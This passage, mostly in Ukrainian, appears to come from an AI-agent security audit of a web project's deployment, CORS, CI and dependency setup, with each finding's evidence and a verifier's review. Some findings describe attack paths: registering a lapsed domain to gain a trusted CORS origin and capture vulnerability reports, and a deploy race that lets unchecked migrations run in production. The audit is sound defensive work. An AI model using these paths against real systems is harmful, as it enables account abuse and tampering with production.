Verified on HEAD. Dockerfile.api:83 and :150 use `node:22.16.0-alpine` with no digest. :213 uses `gcr.io/distroless/nodejs22-debian13:nonroot`, a floating tag with no digest. :224 and :237 do `COPY --from=busybox:stable-musl /bin/busybox` to /bin/sh and /bin/wget, a floating tag that becomes the shell running the ENTRYPOINT (migrations plus server). The renovate.json pinDigests rules cover only github-actions and pgvector (docker-compose and github-actions managers), not the dockerfile manager. posthog-release-annotation.yml:42 and :47 (`actions/checkout@v4`, `actions/setup-node@v4`) are the only non-SHA-pinned actions in .github/workflows. Its secret is scoped to a later step, but a compromised setup-node could still trojan `node` for that step. The workflow is dispatch-only and the actions are GitHub-owned, which lowers the risk. `npx --yes turbo@2` sits in both vercel.json ignoreCommands and `pnpm add -g vercel@59` in deploy-landing.yml (manual). By contrast, scripts/deploy-vercel.mjs pins vercel@54.9.1 exactly. container-scan.yml is schedule/dispatch only and does not gate deploys. The distroless and node-builder digest part is already tracked as SECURITY-20260804-RUNTIME (open). busybox, turbo@2, vercel@59 and the posthog actions are new. Supply-chain hygiene, low.
```

**Додаткові докази верифікатора:**

```text
grep: `Dockerfile.api:224:COPY --from=busybox:stable-musl /bin/busybox /bin/sh`, `:213:FROM ... distroless/nodejs22-debian13:nonroot`. Unpinned uses: only `.github/workflows/posthog-release-annotation.yml:42/47`. renovate.json:144-153 pinDigests only for github-actions and pgvector. container-scan.yml on: workflow_dispatch plus weekly cron.
```

### [low] Ручні шляхи деплою в прод без запобіжників

- **ID:** `client-static/infra-headers-ci-deps#12` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** .github/workflows/deploy-landing.yml:25-26,100-116; .github/workflows/deploy-api.yml:25-27,36; scripts/deploy-vercel.mjs (main: build з робочого дерева); scripts/deploy-api.mjs:40,166-175
- **Вплив:** Непереглянутий або незакомічений код може потрапити в прод web/landing, а ручний деплой API оминає CI-гейт для міграцій. Скрипт може відзвітувати «Готово» за чужим деплоєм, а прев'ю вводить в оману щодо джерела.
- **Що зробити:** deploy-landing: гейт `github.ref == 'refs/heads/main'` + environment з reviewer, токен через env VERCEL_TOKEN. deploy-api dispatch: перевіряти статус CI для SHA через `gh api .../commits/$SHA/check-runs`. deploy-vercel.mjs: відмовляти при брудному дереві або HEAD != origin/main без явного прапорця. deploy-api.mjs: стежити за власним uuid, звіряти коміт і виправити текст прев'ю.

**Докази:**

```text
deploy-landing.yml: лише `workflow_dispatch`, без `if: github.ref == 'refs/heads/main'`; `vercel deploy --prebuilt --prod` збирає гілку, з якої запущено; токен іде аргументом `--token="${{ secrets.VERCEL_TOKEN }}"`. deploy-api.yml: ручний dispatch з main деплоїть HEAD без перевірки, що CI цього SHA зелений. deploy-vercel.mjs: «Збірка з локального HEAD ... (їде те, що зараз у робочому дереві)», без перевірки чистого дерева і HEAD == origin/main. deploy-api.mjs: стежить за `data.deployments?.[0]` замість щойно поставленого deployment_uuid, не звіряє задеплоєний коміт, а прев'ю досі пише «Джерело: git@bitbucket.org:skords01/sergeant.git».
```

**Відтворення:**

```text
Прочитати вказані рядки; `pnpm deploy:web` без --yes друкує прев'ю з «робочим деревом».
```

**Верифікатор:**

```text
The facts are verified, but these are owner-only manual fallbacks, and part of the behaviour is documented as intentional. deploy-landing.yml has only `on: workflow_dispatch` and no `if: github.ref == 'refs/heads/main'` on the job, so a dispatch from any branch builds and deploys that branch with `--prod`. The token is passed as `--token="${{ secrets.VERCEL_TOKEN }}"` on lines 100, 107 and 116; it is masked in logs, so that part is minor. deploy-api.yml is gated to main (`if: github.ref == 'refs/heads/main'`) but does not check that CI for the SHA is green. Its header comment says that is intended ('workflow_dispatch лишається для ручного перезапуску ... так само як запасний шлях'), so the remaining risk is an operator mistake. scripts/deploy-vercel.mjs openly builds from the working tree, and its preview says so ('їде те, що зараз у робочому дереві'). It does not check for a clean tree or HEAD==origin/main, though it does run the e2e-seed boundary scan. scripts/deploy-api.mjs has two real bugs. It polls `data.deployments?.[0]` instead of the `deployment_uuid` it just queued, so with the new CI auto-deploy running concurrently it can report 'Готово' for someone else's deployment, and it never compares the commit with origin/main. Its preview still says 'Джерело: git@bitbucket.org:skords01/sergeant.git' (line 42), although AGENTS.md says Coolify builds from GitHub since 2026-09-30. Every path needs repo write access or a local `--yes`, so this is an operator-safety and accuracy issue, not an external vulnerability. Low.
```

**Додаткові докази верифікатора:**

```text
deploy-landing.yml:25-26 (dispatch only), jobs.deploy has no `if`. deploy-api.mjs:42 has the stale Bitbucket source text, :166-180 polls `data.deployments?.[0]` and prints `latest.commit` without comparing it. DG-32 (2026-09-23 docs-governance audit) covered only the missing --yes/preview, not these points.
```

### [low] Локальний docker-compose публікує Postgres на всіх інтерфейсах зі слабкими креденшелами hub/hub

- **ID:** `client-static/infra-headers-ci-deps#15` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** docker-compose.yml (ports: "5432:5432", POSTGRES_PASSWORD: hub)
- **Вплив:** Dev-БД з реальними тестовими даними (а часто й з імпортованими виписками розробника) відкрита для будь-кого в локальній мережі.
- **Що зробити:** Привʼязати до `127.0.0.1:5432:5432` за аналогією з ops-compose.

**Докази:**

```text
`ports: - "5432:5432"` (без 127.0.0.1) і `POSTGRES_USER: hub / POSTGRES_PASSWORD: hub`. У ops/docker-compose.ops.yml порти вже привʼязані до 127.0.0.1, тут ні.
```

**Відтворення:**

```text
Прочитати docker-compose.yml; `pnpm dev:db` на ноутбуці в публічній Wi-Fi робить БД доступною з LAN.
```

**Верифікатор:**

```text
Перевірено в коді. У /home/user/sergeant/docker-compose.yml:35-38 стоять `POSTGRES_USER: hub` / `POSTGRES_PASSWORD: hub` і `ports: - "5432:5432"` без адреси прив'язки. Docker публікує такий порт на 0.0.0.0. На Linux він ще й обходить ufw, а Docker Desktop (Windows/macOS) теж слухає на всіх інтерфейсах хоста. Що б це нейтралізувало, я шукав і не знайшов: override-файлу немає, нема й доку, який вимагав би доступу до БД з LAN. Мобільний/LAN-сценарій потребує лише API-порту, не Postgres, а всі доки й скрипти ходять на 127.0.0.1/localhost. ops/docker-compose.ops.yml:17,44 уже прив'язує порти до 127.0.0.1, тож у самому репо цю конвенцію вже застосовано. Коментар у шапці файлу визнає лише слабкі креденшели («LOCAL DEVELOPMENT ONLY»), про прив'язку до інтерфейсу там нічого. Тяжкість лишається low: це defense-in-depth для машини розробника, на прод не впливає (прод-БД живе під Coolify). Опис впливу про «імпортовані виписки» спекулятивний, але локальна верифікаційна БД (docs/engineering/testing/verification/local-environment.md) справді може містити дані, схожі на реальні. Публікація 5432:5432 у CI-воркфлоу (services на ефемерному раннері) — не проблема.
```

**Додаткові докази верифікатора:**

```text
docker-compose.yml:38 `- "5432:5432"`; ops/docker-compose.ops.yml:17 `"127.0.0.1:9090:9090"`, :44 `"127.0.0.1:3001:3000"`. У попередніх аудитах прив'язку не згадано: security-comprehensive-2026-08-04.md:197 розбирає лише Grafana з ops-compose, 2026-08-05-orphaned-code-audit.md:358 лише застарілий коментар у docker-compose.yml.
```

### [low] pnpm audit --prod: 2 high (прийнятий image-size), 10 moderate, 1 low; досяжних у рантаймі немає, але exact-overrides тепер тримають вразливі версії

- **ID:** `client-static/infra-headers-ci-deps#16` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Серйозність від шукача:** info (переоцінено верифікатором)
- **Де:** package.json pnpm.overrides (`qs@&gt;=6.11.1 &lt;6.15.2`: "6.15.2", `brace-expansion@&lt;1.1.20`: "1.1.20", `brace-expansion@&gt;=2.0.0 &lt;2.1.6`: "2.1.6"); docs/governance/security/audit-exceptions.md:73-83; pnpm-overrides.md:206-212
- **Вплив:** Прямої експлуатації немає. Але exact-pin overrides фіксують версії, що вже мають advisory, а виняток image-size спливає за 30 днів, після чого nightly-audit впаде.
- **Що зробити:** Підняти overrides до qs 6.16.0 і brace-expansion 1.1.21/2.1.7 (або прибрати exact-піни). Переоцінити виняток image-size до 2026-10-31. Синхронізувати pnpm-overrides.md із package.json.

**Докази:**

```text
metadata: {low:1, moderate:10, high:2, critical:0}. high: image-size GHSA-5p2g-fcmc-qvqq, GHSA-w3rx-r6r6-pgpr (виняток до 2026-10-31, у Dockerfile.api вирізається). moderate: qs 6.15.2 (GHSA-4mjr-xmp4-gh2g, GHSA-x5fp-wj9c-mxmx, фікс 6.16.0) через express 5 / body-parser, але сервер не має urlencoded/extended-парсингу і використовує дефолтний 'simple' query parser, тож недосяжно; @opentelemetry/core 1.30.1 через @sentry/node 8.55.2 (baggage DoS, обмежений 16 КБ ліміту заголовків Node); fflate 0.4.8 і dompurify 3.4.13 через posthog-js (клієнт, вразливі гілки unzipSync/IN_PLACE не використовуються); brace-expansion, decode-uri-component, fast-uri, vitest/@vitest/mocker (тулінг/мобайл). Таблиця в pnpm-overrides.md розійшлася з package.json (там 1.1.18/2.1.4/5.0.9 проти фактичних 1.1.20/2.1.6/5.0.11).
```

**Відтворення:**

```text
cd /home/user/sergeant && pnpm audit --prod --json > <scratch>/agents/client-static-infra-headers-ci-deps/pnpm-audit-prod.json (звіт збережено там)
```

**Верифікатор:**

```text
Повторний `pnpm audit --prod --json` відтворив той самий набір advisory: image-size ×2 high, qs ×2, @opentelemetry/core, fflate, vitest/@vitest/mocker, fast-uri, brace-expansion ×2 і decode-uri-component moderate, dompurify low. ПЛЮС зʼявився новий high: node-forge 1.4.0 GHSA-86w9-cpqp-85rv (advisory оновлено 2026-10-01T21:09Z, патчу немає). Твердження про exact-піни перевірено на рівні механіки. pnpm 9.15.1 (~/.local/share/pnpm/.tools/pnpm/9.15.1, overrideDeps) зіставляє селектор override-а через isIntersectingRange, тому `qs@>=6.11.1 <6.15.2` перетинається з express 5.2.1 `qs: ^6.14.0` і переписує його на точне `6.15.2`. Lockfile це підтверджує: express → `qs: 6.15.2`, minimatch@3.1.5 → `brace-expansion: 1.1.20`, minimatch@5.1.9/9.x → `2.1.6`. Отже `pnpm update` не підніме їх до виправлених 6.16.0 / 1.1.21 / 2.1.7, поки піни стоять. Досяжність qs у рантаймі перевірено: на сервері немає ні `app.set('query parser')`, ні `express.urlencoded`; LiqPay-колбек читається як raw і парситься через URLSearchParams (routes/billing.ts:357, http/bodySizePolicy.ts:205-209). Отже, як і сказано в знахідці, експлуатації немає. Розбіжність доку теж підтверджено: pnpm-overrides.md:206-212 і сусідні рядки показують brace-expansion 1.1.18/2.1.4/5.0.9, js-yaml 3.15.0/4.3.0, undici ^6.28.0 і sharp >=0.35.0 проти 1.1.20/2.1.6/5.0.11, 3.15.2/4.3.2, ^6.28.1 і >=0.35.4 у package.json. Одна частина знахідки — не дефект: спливання винятку image-size 2026-10-31 задумане (дата, на яку виняток треба переоцінити). Тяжкість піднято з info до low, бо гейт `node scripts/ci/audit-exceptions.mjs --prod` уже зараз ЧЕРВОНИЙ через node-forge, без запису в реєстрі винятків (exit=1), тож наступний плановий/ручний прогін джоби `security-audit` у ci.yml і nightly-audit впаде. node-forge доходить лише через тулінг expo/@react-native/dev-middleware/selfsigned, тож до рантайму він, найімовірніше, теж не досяжний. На PR гейт не запускається (`if: schedule || workflow_dispatch`), тож мерджі він не блокує.
```

**Додаткові докази верифікатора:**

```text
Скрипти й вивід лежать у <scratch>/agents/verify-client-static-infra-headers-ci-deps/: pnpm-audit-prod.json (metadata low:1 moderate:10 high:3) і gate-prod.txt (`❌ audit gate (production): 1 un-waived: node-forge high GHSA-86W9-CPQP-85RV — no ledger entry`). У виводі audit для image-size тепер `patched_versions: >=2.0.3`, тобто в upstream є фікс у мажорі 2.x. Через це обґрунтування в audit-exceptions.md («Патчу не існує», patched `<0.0.0`) застаріле і розходиться з коментарем у Dockerfile.api:187 («фікс лише в мажорі 2.0.3»). node-forge присутній у 610 шляхах, усі через expo@52 → @expo/cli / @react-native/dev-middleware → selfsigned; Dockerfile.api:191-202 його не вирізає, тож він потрапить і в образ сервера (шум для Trivy). Перевірку політики overrides (pnpm-overrides-policy.md п.2) exact-піни формально не порушують: вони вужчі за single-major. Перевірка свіжості pnpm-overrides.md існує (scripts/check-pnpm-overrides-staleness.mjs), але звіряє лише дати `Last reviewed:`, а не значення таблиці з package.json.
```

### [low] Гейт автодеплою API можна обійти гонкою: Coolify збирає голову main у момент білду, а не перевірений TARGET_SHA

- **ID:** `client-static/infra-headers-ci-deps#2` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Серйозність від шукача:** medium (переоцінено верифікатором)
- **Де:** .github/workflows/deploy-api.yml:84-90 (ls-remote), 118-128 (POST /api/v1/deploy без коміту), 180-184 (звірка коміту ПІСЛЯ деплою); Dockerfile.api:321 (міграції в ENTRYPOINT)
- **Вплив:** Обовʼязковий гейт (check, critical-flow, migration-lint, migration-down-drill) не гарантує, що на прод-БД потрапляють лише перевірені міграції. Власник мерджить швидко й часто, тож це вікно реальне, а наслідок незворотний (DDL на живій базі).
- **Що зробити:** Деплоїти конкретний SHA: перед POST виставити в Coolify `git_commit_sha` = TARGET_SHA через API застосунку (або тригерити з параметром коміту, якщо версія Coolify його підтримує) і повертати HEAD після деплою. Альтернатива: збирати образ у CI з TARGET_SHA і деплоїти за digest. Додатково варто, щоб migrate.js відмовлявся стартувати, якщо GIT_SHA образу не збігається з очікуваним.

**Докази:**

```text
План-крок: `HEAD_SHA=$(git ls-remote origin refs/heads/main | cut -f1); if [ "$HEAD_SHA" != "$TARGET_SHA" ]; then skip ...`. Потім `curl -X POST "$BASE/api/v1/deploy?uuid=$APP_UUID"`: коміт не передається, а коментар у файлі прямо каже «Coolify збирає ГОЛОВУ `main`, а не конкретний коміт». Розбіжність ловить лише Verify-крок, уже після деплою: `if [ "$DEPLOYED" != "$TARGET_SHA" ]; then echo "::error::Coolify зібрав ... а не ${TARGET_SHA}"`. ENTRYPOINT образу: `node dist-server/migrate.js && exec node dist-server/index.js`, тож міграції чужого коміту вже застосовано на живій БД. Додатково: Vercel викочує web/landing з main без жодного CI-гейта (apps/web/vercel.json `git.deploymentEnabled.main` + ignoreCommand лише перевіряє affected), тож при червоному CI фронт лишається попереду бекенду на невизначений час, а не на ~25 хв, про які йдеться в AGENTS.md.
```

**Відтворення:**

```text
Статично: deploy-api.yml:84-128. Сценарій: мерж A, CI(A) зелений, deploy-api(A) пройшов ls-remote; за ці секунди (або поки деплой стоїть у черзі Coolify) в main мерджиться B. Coolify клонує B, ENTRYPOINT застосовує міграції B, яких CI ще не перевірив; Verify-крок червоний, але прод уже на B.
```

**Верифікатор:**

```text
Гонка в коді реальна. deploy-api.yml:87-90 звіряє HEAD main через ls-remote до того, як замовити деплой. POST /api/v1/deploy?uuid= (рядки 126-128) коміт не передає. За джерелом Coolify v4 (DeployController::deploy_resource викликає queue_application_deployment без commit) ApplicationDeploymentJob резолвить HEAD гілки через `git ls-remote refs/heads/main` уже під час виконання джоба: shouldResolveBranchHeadCommit() для commit=''|'HEAD'. Розбіжність ловить лише Verify-крок (180-184), уже після того, як ENTRYPOINT застосував міграції. Severity знижено до low. Вікно між ls-remote і стартом джоба Coolify триває секунди, якщо Coolify не тримає деплой у черзі. Коміт B, що проскочить, уже пройшов CI на PR: check і critical-flow там required, migration-lint і migration-down-drill на PR теж біжать, хоч і не required. Тож неперевірений повністю код на прод не потрапляє, пропускається лише повторна перевірка post-merge на main. Те, що фронт іде раніше за бекенд, власник прийняв 2026-10-01 (AGENTS.md § Deployment). Нюанс із червоним CI, коли розрив стає безстроковим, слушний, але другорядний.
```

**Додаткові докази верифікатора:**

```text
Coolify v4.x ApplicationDeploymentJob.php:2908-2973 (ls-remote refs/heads/{branch} під час джоба, $this->commit = SHA із ls-remote) і 2984-2989 (shouldResolveBranchHeadCommit). DeployController.php:541-548: queue_application_deployment без commit. Скрипт: <scratch>/agents/verify-client-static-infra-headers-ci-deps/coolify2.mjs
```

### [low] У проді немає X-Server-Build-Id: GIT_SHA більше ніхто не передає, тож детектор дрейфу SW і release для серверного Sentry/метрик мертві

- **ID:** `client-static/infra-headers-ci-deps#5` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** Dockerfile.api:248-254; apps/server/src/http/buildIdHeader.ts:23-40; apps/server/src/sentry.ts:216-231; apps/web/src/shared/api/index.ts:33-39; .github/workflows/deploy-api.yml (немає build-arg)
- **Вплив:** Механізм PR-21 (примусове оновлення застарілого service worker, коли збірки клієнта й сервера розійшлися) у проді не спрацьовує: клієнт трактує відсутність заголовка як «невідомо». Серверні події Sentry йдуть без release, метрика app_build_info показує "unknown", тож інцидент не прив'язати до коміту.
- **Що зробити:** У Dockerfile.api додати `ARG SOURCE_COMMIT` і `ENV GIT_SHA=${SOURCE_COMMIT}` та ввімкнути в Coolify «Include Source Commit in Build», або додати SOURCE_COMMIT у каскади buildIdHeader/sentry/registry. Оновити застарілий коментар. Тоді /health теж зможе віддавати версію.

**Докази:**

```text
Dockerfile.api: «Coolify pulls a prebuilt ghcr image, so `deploy-api.yml` passes `--build-arg GIT_SHA=${{ github.sha }}`». Тепер Coolify сам збирає з GitHub (deploy-api.yml:17-18: «Образу в ghcr.io більше немає»), і build-arg ніхто не передає. Каскад resolveServerBuildId: SENTRY_RELEASE, GIT_SHA, VERCEL_GIT_COMMIT_SHA, GITHUB_SHA, BUILD_ID; змінної, яку інжектить Coolify (SOURCE_COMMIT), там немає. Живі відповіді прода 2026-10-01: https://api.sergeant.com.ua/health, /api/v1/me (напряму і через app.sergeant.com.ua) повертають `x-server-build-id= (absent)`, при тому що CORS Expose-Headers його оголошує.
```

**Відтворення:**

```text
NODE_USE_ENV_PROXY=1 NODE_EXTRA_CA_CERTS=/root/.ccr/ca-bundle.crt node <scratch>/agents/client-static-infra-headers-ci-deps/bid.mjs
```

**Верифікатор:**

```text
Живий прод: x-server-build-id відсутній і на api.sergeant.com.ua/health, і на /api/v1/me (напряму та через app.*), хоча Access-Control-Expose-Headers його оголошує, а app.ts:140 монтує serverBuildIdMiddleware. Відсутність заголовка означає, що весь каскад resolveServerBuildId (SENTRY_RELEASE, GIT_SHA, VERCEL_GIT_COMMIT_SHA, GITHUB_SHA, BUILD_ID) у проді порожній. Ті самі змінні годують resolveSentryRelease і app_build_info (commit і release стають "unknown"). Коментар у Dockerfile.api:248-252 про `--build-arg GIT_SHA` із deploy-api.yml застарів: Coolify сам збирає з GitHub, а в deploy-api.yml build-arg немає. Coolify під час деплою справді виставляє SOURCE_COMMIT (set_coolify_variables), але в коді його ніхто не читає (grep по репо порожній). Клієнт (shared/api/index.ts) публікує build id лише тоді, коли заголовок є, тож детектор дрейфу SW у проді неактивний.
```

**Додаткові докази верифікатора:**

```text
<scratch>/agents/verify-client-static-infra-headers-ci-deps/live1.mjs (2026-10-02): всі три URL дають build=(absent), expose='Retry-After, X-Server-Build-Id'. grep SOURCE_COMMIT по репо: 0 збігів.
```

### [low] Застарілий домен sergeant.2dmanager.com.ua (не резолвиться) досі довірений: credentialed CORS, App Links, deep links, security.txt; vercel-піддомени з allowlist ніким не зайняті

- **ID:** `client-static/infra-headers-ci-deps#6` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/server/src/http/cors.ts:25 (PROD_ORIGINS); apps/mobile-shell/android/app/src/main/AndroidManifest.xml:66 (autoVerify=true); apps/mobile-shell/src/index.ts:172; apps/mobile/src/lib/deepLinks.ts:34; apps/mobile/app.config.ts:69; apps/web/src/core/observability/deployEnvironment.ts:52,54; apps/web/public/.well-known/security.txt:5; docs/governance/security/beta-tester-brief.md:8; apps/web/vercel.json redirects (fizruk.vercel.app)
- **Вплив:** Якщо реєстрація 2dmanager.com.ua спливла (.com.ua реєструє будь-хто), новий власник отримує origin з credentialed CORS до прод-API, «офіційну» адресу security.txt, з якої можна перехоплювати звіти про вразливості, і хост App Links/deep links у мобільних оболонках. На Android ≤11 неверифікований хост у тому самому intent-filter валить autoVerify для всіх хостів. Прямий доступ до сесій обмежений тим, що веб-кука живе на app.sergeant.com.ua за проксі. Зайняти fizruk/beta-tau-gilt.vercel.app може будь-хто, але наслідок лише в класифікації середовища в Sentry/PostHog.
- **Що зробити:** Прибрати sergeant.2dmanager.com.ua з PROD_ORIGINS, DEEP_LINK_HTTPS_HOSTS, AndroidManifest, apps/mobile, deployEnvironment, security.txt і beta-tester-brief (або підтвердити, що домен досі належить проєкту, і відновити DNS). Прибрати beta-tau-gilt.vercel.app з canonical hosts і мертвий redirect fizruk.vercel.app. Додати в check-canonical-hosts перевірку, що кожен хост з allowlist резолвиться.

**Докази:**

```text
Прод-preflight OPTIONS https://api.sergeant.com.ua/api/v1/me з `Origin: https://sergeant.2dmanager.com.ua` повертає `ACAO=https://sergeant.2dmanager.com.ua ACAC=true` (localhost і evil.example отримують null, тобто стару знахідку 1.2 закрито). Сам хост не резолвиться: http://sergeant.2dmanager.com.ua і http://2dmanager.com.ua дають `ENOTFOUND`, так само як неіснуючий nonexistent-zzqq-12345.com.ua. beta-tester-brief відправляє тестерів репортити вразливості через https://sergeant.2dmanager.com.ua/.well-known/security.txt. beta-tau-gilt.vercel.app (canonical hosts, deployEnvironment.ts:54) і fizruk.vercel.app (redirect у vercel.json) повертають `404 DEPLOYMENT_NOT_FOUND`, тобто ці імена проєктів ніким не зайняті.
```

**Відтворення:**

```text
NODE_USE_ENV_PROXY=1 NODE_EXTRA_CA_CERTS=/root/.ccr/ca-bundle.crt node <scratch>/agents/client-static-infra-headers-ci-deps/pf.mjs; .../f3.mjs; .../f4.mjs
```

**Верифікатор:**

```text
Через DoH (dns.google і cloudflare-dns) 2dmanager.com.ua та sergeant.2dmanager.com.ua повертають NXDOMAIN (Status=3), authority = SOA зони com.ua. Домен не делеговано в реєстрі, тобто його, найімовірніше, може зареєструвати будь-хто. Прод-preflight з Origin https://sergeant.2dmanager.com.ua повертає ACAO з цим origin і ACAC=true, evil.example отримує null. Хост досі в PROD_ORIGINS (cors.ts:25), в AndroidManifest (autoVerify), deepLinks у mobile та mobile-shell, deployEnvironment.ts:52, Canonical у security.txt і beta-tester-brief.md:8. fizruk.vercel.app і beta-tau-gilt.vercel.app дають 404 DEPLOYMENT_NOT_FOUND. Low коректно. Кукі сесії host-only: без crossSubDomainCookies вони ставляться на app.sergeant.com.ua за проксі, тож credentialed CORS до api.* для веб-юзерів майже нічого не дає. Мобільний контур на паузі (ADR-0094). Реальний ризик полягає в перехопленні звітів про вразливості через підроблений security.txt і в App Links.
```

**Додаткові докази верифікатора:**

```text
<scratch>/agents/verify-client-static-infra-headers-ci-deps/dns.mjs: `2dmanager.com.ua NS Status=3 Authority=[com.ua SOA ho1.com.ns.ua]`; `preflight 2dmanager: 200 ACAO=https://sergeant.2dmanager.com.ua ACAC=true`; `preflight evil: ACAO=null`; fizruk.vercel.app і beta-tau-gilt.vercel.app: 404 DEPLOYMENT_NOT_FOUND. auth.ts:65-84: лише sameSite none і secure, домен кук не задано.
```

### [low] security.txt веде на неіснуючий репозиторій, а його Expires з 2026-12-01 зробить червоним `check` і зупинить усі мержі та автодеплой

- **ID:** `client-static/infra-headers-ci-deps#7` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/web/public/.well-known/security.txt:1-6; scripts/check-security-txt-expiry.sh (поріг &lt;30 днів); .github/workflows/ci.yml:217-218 (крок у required-джобі check)
- **Вплив:** Дослідник, який знайшов вразливість, не може її повідомити (або повідомить у чужий репозиторій, якщо імʼя Skords-01 колись звільниться). За 61 день CI сам стане червоним на кожному PR і push у main, і деплой бекенду, включно з хотфіксами, зупиниться, доки хтось не оновить файл.
- **Що зробити:** Змінити Contact на https://github.com/SkOrDs-02/sergeant/security/advisories/new (і переконатися, що Private vulnerability reporting увімкнено) плюс додати email. Оновити Expires зараз і додати в scheduled-workflow попередження за 60 днів, щоб guard не був першим сигналом. Розглянути, чи має цей guard блокувати деплой.

**Докази:**

```text
Прод https://app.sergeant.com.ua/.well-known/security.txt (200): `Contact: https://github.com/Skords-01/Sergeant/security/advisories/new`, `Expires: 2026-12-31T23:59:59Z`. `git ls-remote https://github.com/Skords-01/Sergeant` -> `could not read Username` (репо не існує або приватне), тоді як `SkOrDs-02/sergeant` відповідає HEAD 9093bab. AGENTS.md: Skords-01/Sergeant це «історія старого репо». Скрипт guard: `if (( days_until_expiry < 30 )); then echo "::error::..."` у джобі `check`, а вона required-чек на main і в `needs:` у deploy-api.
```

**Відтворення:**

```text
NODE_USE_ENV_PROXY=1 NODE_EXTRA_CA_CERTS=/root/.ccr/ca-bundle.crt node <scratch>/agents/client-static-infra-headers-ci-deps/gh.mjs; git ls-remote https://github.com/Skords-01/Sergeant HEAD; bash scripts/check-security-txt-expiry.sh з датою >= 2026-12-01.
```

**Верифікатор:**

```text
Прод /.well-known/security.txt (200): `Contact: https://github.com/Skords-01/Sergeant/security/advisories/new`, `Expires: 2026-12-31T23:59:59Z`. `git ls-remote https://github.com/Skords-01/Sergeant` поводиться так само, як заздалегідь неіснуючий репозиторій (could not read Username), а аудит 2026-09-23-dead-github-remotes фіксує, що старі акаунти заблоковані. Отже Contact мертвий. До того ж на новому репо SkOrDs-02/sergeant private vulnerability reporting вимкнено (`gh api .../private-vulnerability-reporting` дає {"enabled":false}), тож проста заміна URL нічого не дасть без увімкнення PVR. Guard scripts/check-security-txt-expiry.sh (<30 днів, exit 1) стоїть у джобі `check` (ci.yml:271-277), а `deploy-api` має needs: [check, ...]. Уточнення дати: integer-ділення дає 30 днів 2026-12-01 і 29 днів з 2026-12-02 00:00:01 UTC, тож червоним `check` стане з 2026-12-02, а не 12-01. Це однорядковий фікс, тому low.
```

**Додаткові докази верифікатора:**

```text
roothdr.mjs: тіло прод security.txt. gh api repos/SkOrDs-02/sergeant/private-vulnerability-reporting дає {"enabled":false}. git ls-remote Skords-01/Sergeant і Skords-01/definitely-not-a-repo-zz дають однакову помилку `could not read Username`. Розрахунок: (2026-12-31T23:59:59Z − 2026-12-02T00:00:01Z)/86400 = 29.
```

### [low] CSP-репорти лендингу з Chromium втрачаються: report-to веде на крос-оріджинний API, а origin лендингу не в CORS allowlist (report-uri при цьому ігнорується)

- **ID:** `client-static/infra-headers-ci-deps#8` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/landing/vercel.json:50-56 (Reporting-Endpoints + report-to); apps/server/src/http/cors.ts:23-27 (PROD_ORIGINS без https://sergeant.com.ua)
- **Вплив:** Порушення CSP на sergeant.com.ua з Chrome/Edge (більшість трафіку) не доходять до csp_violation_total. Регресія CSP або спроба інʼєкції на лендингу непомітна, хоча моніторинг формально налаштовано.
- **Що зробити:** Додати https://sergeant.com.ua (і www, якщо використовується) у CORS лише для /api/csp-report (без credentials) або віддавати `Access-Control-Allow-Origin: *` саме на цьому шляху. Альтернатива: прибрати report-to з лендингу й лишити лише report-uri.

**Докази:**

```text
Прод-preflight OPTIONS https://api.sergeant.com.ua/api/csp-report: `Origin https://sergeant.com.ua -> ACAO=null`; `Origin https://app.sergeant.com.ua -> ACAO=https://app.sergeant.com.ua`. Локальний тест у Chromium (rep2.mjs): сторінка з CSP лише з `report-uri` дала `POST /uri-uri-only ct=application/csp-report`; сторінки з `report-uri ...; report-to csp-endpoint` за 120 с не надіслали жодного report-uri POST, тобто за наявності report-to Chromium його ігнорує. Доставка Reporting API в Chromium до крос-оріджинного endpoint-а йде через CORS-preflight, а для origin лендингу API відповідає без ACAO.
```

**Відтворення:**

```text
NODE_USE_ENV_PROXY=1 NODE_EXTRA_CA_CERTS=/root/.ccr/ca-bundle.crt node <scratch>/agents/client-static-infra-headers-ci-deps/pf2.mjs; node .../rep2.mjs (локально, ~2 хв).
```

**Верифікатор:**

```text
Code: apps/landing/vercel.json:50-55 sends `Reporting-Endpoints: csp-endpoint="https://api.sergeant.com.ua/api/csp-report"` plus a CSP with both `report-uri` and `report-to csp-endpoint`. apps/server/src/http/cors.ts:23-27 PROD_ORIGINS has only sergeant.vercel.app, sergeant.2dmanager.com.ua and app.sergeant.com.ua, and setCorsHeaders sets ACAO only for allowed origins. I re-ran the prod preflight: for both https://sergeant.com.ua and https://www.sergeant.com.ua (the landing is also served on www, 200 with no redirect) the response is 200 with ACAO=null, while app.sergeant.com.ua gets ACAO echoed. The Reporting API spec uploads reports with request mode `cors`, and Chromium's ReportingUploader sends a cross-origin preflight and needs ACAO to be `*` or the report origin. So every Chromium upload from the landing fails the preflight. I reproduced the second half locally in Chromium 141: a page whose CSP has `report-uri` plus `report-to` sent no report-uri POST at all, while a page with only `report-uri` sent `POST ... ct=application/csp-report` within 1 s. That matches the CSP3 rule that report-uri is ignored when report-to is present. I could not reproduce the Reporting API upload failing end to end. In this sandbox Chromium never delivers any Reporting API report, even to the CORS-allowed origin: CDP shows the reports cycling Queued/Pending with completedAttempts=0. I also tried --short-reporting-delay, the background-sync permission and the legacy Report-To header, with the same result. The CORS failure therefore rests on the spec, Chromium's uploader and the verified prod preflight. Firefox and older Safari still send report-uri. The web app is not affected because its origin is allowlisted. Real but low impact: landing monitoring is partly blind, with no direct exploit. docs/operations/observability/csp-monitoring.md wrongly claims that report-uri and report-to shipped together 'never lose violations'.
```

**Додаткові докази верифікатора:**

```text
